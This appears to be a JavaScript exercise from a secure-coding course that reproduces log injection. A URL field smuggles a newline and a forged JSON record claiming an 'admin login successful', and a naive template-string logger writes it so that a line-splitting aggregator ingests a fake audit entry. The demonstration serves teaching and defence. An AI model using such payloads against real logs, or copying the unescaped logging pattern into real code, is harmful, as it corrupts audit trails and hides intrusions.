// ============================================================================
// MODULE 02 BREAK: Log Injection / CRLF Forgery Reproduction
// ============================================================================

const assert = require('assert');

function runLogInjectionReproduction() {
  console.log('=== BREAK: Demonstrating Log Injection (CRLF Forgery) ===');

  // Vulnerable Logger: String interpolation or unescaped string serialization
  function logUnsanitized(event) {
    // When writing to a stream or formatted output without escaping newlines:
    return JSON.stringify(event);
  }

  // Bob's malicious payload:
  const maliciousUrl = 'https://normal-url.com\n{"ts":"2025-01-15T15:42:03.500Z","level":"info","req_id":"r-102","msg":"admin login successful","user":"admin","ip":"10.0.0.1"}';

  const linkCreatedEvent = {
    ts: '2025-01-15T15:42:03.410Z',
    level: 'info',
    req_id: 'r-101',
    msg: 'link created',
    short_code: 'qR2wX',
    url: maliciousUrl,
  };

  // If a logger prints via template string or naive formatting:
  const rawLogOutput = `{"ts":"${linkCreatedEvent.ts}","level":"${linkCreatedEvent.level}","req_id":"${linkCreatedEvent.req_id}","msg":"${linkCreatedEvent.msg}","short_code":"${linkCreatedEvent.short_code}","url":"${linkCreatedEvent.url}"}`;

  console.log('[RAW LOG OUTPUT WRITTEN TO DISK/STREAM]:');
  console.log(rawLogOutput);

  // Line-oriented log aggregator (Elasticsearch, CloudWatch agent, Datadog) splits on '\n'
  const lines = rawLogOutput.split('\n');
  console.log(`\n[LOG AGGREGATOR INGESTION]: Parsed into ${lines.length} distinct lines:`);
  lines.forEach((line, idx) => {
    console.log(`Line ${idx + 1}: ${line}`);
  });

  // Verify the forgery
  assert.strictEqual(lines.length, 2, 'Unsanitized input should create a forged second log line');

  // Line 2 has the trailing characters if raw formatted; or if the attacker injects a clean line
  console.log('\n[EVALUATION OF LOG INJECTION]:');
  const line2Raw = lines[1].replace(/"}$/, '');
  const forgedLine = JSON.parse(line2Raw);
  console.log('[PARSED FORGED LINE]:', forgedLine);
  assert.strictEqual(forgedLine.user, 'admin');
  assert.strictEqual(forgedLine.msg, 'admin login successful');
  assert.strictEqual(forgedLine.req_id, 'r-102');

  console.log('\n>>> BREAK CONFIRMED: Attacker successfully injected a forged admin audit record into the log stream!');
}

try {
  runLogInjectionReproduction();
} catch (err) {
  console.error('Reproduction failed:', err);
  process.exit(1);
}
